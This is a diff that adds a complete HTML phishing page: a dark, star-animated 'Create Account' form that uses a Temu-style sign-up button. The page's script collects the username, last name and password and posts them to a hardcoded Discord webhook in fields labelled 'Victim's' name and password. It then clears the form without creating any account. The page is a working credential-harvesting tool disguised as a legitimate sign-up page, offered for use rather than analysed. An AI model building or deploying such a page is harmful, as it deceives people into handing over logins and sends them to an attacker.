@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Page</title>  
+    <style>
+        body {
+            background-color: #111111;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+
+    }
+
+    .container {
+        background-color: #111111;
+        border-radius: 6px;
+        padding: 30px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        width: 500px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    h1 {
+        text-align: center;
+        color: #fff;
+        font-size: 28px;
+        margin-bottom: 30px;
+        text-transform: uppercase;
+    }
+
+    input {
+        padding: 12px;
+        margin-bottom: 20px;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        width: 100%;
+        background-color: #000000; /* Updated color */
+        color: #fff; /* Updated color */
+    }
+
+    button {
+        background-color: #222;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        padding: 12px;
+        cursor: pointer;
+        font-size: 18px;
+        font-weight: bold;
+        width: 100%;
+        transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+        background-color: #111;
+    }
+
+    /* Star Effect */
+    .stars {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: -1;
+    }
+
+    .star {
+        --star-color: #fff;
+        --star-tail-length: 6em;
+        --star-tail-height: 2px;
+        --star-width: calc(var(--star-tail-length) / 6);
+        --fall-duration: 9s;
+        --tail-fade-duration: var(--fall-duration);
+        position: absolute;
+        top: var(--top-offset);
+        left: -100%;
+        width: var(--star-tail-length);
+        height: var(--star-tail-height);
+        background: linear-gradient(to right, var(--star-color) 50%, transparent);
+        transform: rotate(-35deg);
+        animation: starFall var(--fall-duration) linear infinite;
+    }
+
+    @keyframes starFall {
+        0% {
+            left: 100%;
+            opacity: 0;
+        }
+        100% {
+            left: -100%;
+            opacity: 1;
+        }
+    }
+
+    @keyframes tailFade {
+        0%, 50% {
+            background: linear-gradient(to right, var(--star-color) 50%, transparent);
+        }
+        80% {
+            background: linear-gradient(to right, var(--star-color) 50%, rgba(0, 0, 0, 0));
+        }
+        100% {
+            background: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0));
+        }
+    }
+
+    .star:nth-child(1) {
+        --top-offset: 0;
+        --fall-duration: 5s;
+        --tail-fade-duration: var(--fall-duration);
+        animation: starFall var(--fall-duration) linear infinite,
+                   tailFade var(--tail-fade-duration) linear infinite;
+    }
+
+    .star:nth-child(2) {
+        --top-offset: 10%;
+        --fall-duration: 6s;
+        --tail-fade-duration: var(--fall-duration);
+        animation: starFall var(--fall-duration) linear infinite,
+                   tailFade var(--tail-fade-duration) linear infinite;
+    }
+
+    .star:nth-child(3) {
+        --top-offset: 20%;
+        --fall-duration: 4s;
+        --tail-fade-duration: var(--fall-duration);
+        animation: starFall var(--fall-duration) linear infinite,
+                   tailFade var(--tail-fade-duration) linear infinite;
+    }
+
+    .star:nth-child(4) {
+        --top-offset: 30%;
+        --fall-duration: 7s;
+        --tail-fade-duration: var(--fall-duration);
+        animation: starFall var(--fall-duration) linear infinite,
+                   tailFade var(--tail-fade-duration) linear infinite;
+    }
+
+    .star:nth-child(5) {
+        --top-offset: 40%;
+        --fall-duration: 5s;
+        --tail-fade-duration: var(--fall-duration);
+        animation: starFall var(--fall-duration) linear infinite,
+                   tailFade var(--tail-fade-duration) linear infinite;
+    }
+
+    .star:nth-child(6) {
+        --top-offset: 50%;
+        --fall-duration: 6s;
+        --tail-fade-duration: var(--fall-duration);
+        animation: starFall var(--fall-duration) linear infinite,
+                   tailFade var(--tail-fade-duration) linear infinite;
+    }
+
+    .star:nth-child(7) {
+        --top-offset: 60%;
+        --fall-duration: 4s;
+        --tail-fade-duration: var(--fall-duration);
+        animation: starFall var(--fall-duration) linear infinite,
+                   tailFade var(--tail-fade-duration) linear infinite;
+    }
+
+    .star:nth-child(8) {
+        --top-offset: 70%;
+        --fall-duration: 5s;
+        --tail-fade-duration: var(--fall-duration);
+        animation: starFall var(--fall-duration) linear infinite,
+                   tailFade var(--tail-fade-duration) linear infinite;
+    }
+
+    .star:nth-child(9) {
+        --top-offset: 80%;
+        --fall-duration: 7s;
+        --tail-fade-duration: var(--fall-duration);
+        animation: starFall var(--fall-duration) linear infinite,
+                   tailFade var(--tail-fade-duration) linear infinite;
+    }
+
+    .star:nth-child(10) {
+        --top-offset: 90%;
+        --fall-duration: 6s;
+        --tail-fade-duration: var(--fall-duration);
+        animation: starFall var(--fall-duration) linear infinite,
+                   tailFade var(--tail-fade-duration) linear infinite;
+    }
+    
+    /* Updated CSS for the image */
+    img {
+        width: 150px;
+        height: auto;
+        border-radius: 7%;
+    }
+</style>
+</head>
+<body>
+    <div class="stars">
+        <div class="star"></div>
+        <div class="star"></div>
+        <div class="star"></div>
+        <div class="star"></div>
+        <div class="star"></div>
+        <div class="star"></div>
+        <div class="star"></div>
+        <div class="star"></div>
+        <div class="star"></div>
+        <div class="star"></div>
+    </div>
+
+<div class="container">
+    <h1>Create Account</h1>
+    <img src="https://cdn.discordapp.com/attachments/1098454848673959996/1115820848981479485/logo.f.PNG" alt="Logo" style="margin-bottom: 20px;">
+    <input type="text" id="username" placeholder="Username / Name Or Nickname" style="background-color: black;">
+    <input type="text" id="lastname" placeholder="Last Name / For Security Question" style="background-color: black;">
+    <input type="password" id="password" placeholder="Password" style="background-color: black;">
+    <button onclick="createAccount()">Sign Up With Temu Auto ©</button>
+</div>
+<script>
+    function createAccount() {
+        var username = document.getElementById("username").value;
+        var lastname = document.getElementById("lastname").value;
+        var password = document.getElementById("password").value;
+
+        var data = {
+            "embeds": [
+                {
+                    "color": 0x000000,
+                    "fields": [
+                        {
+                            "name": "Victim's First Name / Username:",
+                            "value": username
+                        },
+                        {
+                            "name": "Victim's Last Name:",
+                            "value": lastname
+                        },
+                        {
+                            "name": "Victim's Password:",
+                            "value": password
+                        }
+                    ]
+                }
+            ]
+        };
+
+        // Sending the data to the Discord webhook
+        fetch("https://discord.com/api/webhooks/1098072896724807771/Bs4J4pb6pvGJCCF51rznycw4a5DH0mVNLWhTc2C_TPbBJKLVuGYcqW1in_EK8ZCuOHjb", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        });
+
+        // Clearing the input fields
+        document.getElementById("username").value = "";
+        document.getElementById("lastname").value = "";
+        document.getElementById("password").value = "";
+    }
+</script>
+</body>
+</html>
